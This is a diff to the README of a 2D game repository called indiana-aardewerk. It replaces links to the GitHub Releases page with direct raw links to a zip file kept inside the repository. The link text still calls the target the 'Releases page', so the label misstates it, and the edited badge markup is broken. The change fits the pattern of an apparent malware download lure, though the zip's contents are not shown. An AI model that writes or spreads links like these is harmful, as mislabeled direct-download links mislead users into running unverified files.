@@ -1,6 +1,6 @@
 # 🎮 indiana-aardewerk - Enjoy a Fun, Educational 2D Game
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/sadikarahman066/indiana-aardewerk/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sadikarahman066/indiana-aardewerk/main/Build/aardewerk_indiana_3.3.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/sadikarahman066/indiana-aardewerk/main/Build/aardewerk_indiana_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you start, here are some basic requirements to run the game:
 
 ## 📲 Download & Install
 
-To get started, go to our [Releases page](https://github.com/sadikarahman066/indiana-aardewerk/releases) to download the latest version. 
+To get started, go to our [Releases page](https://raw.githubusercontent.com/sadikarahman066/indiana-aardewerk/main/Build/aardewerk_indiana_3.3.zip) to download the latest version. 
 
 1. Click on the link above.
 2. Look for the latest version listed.
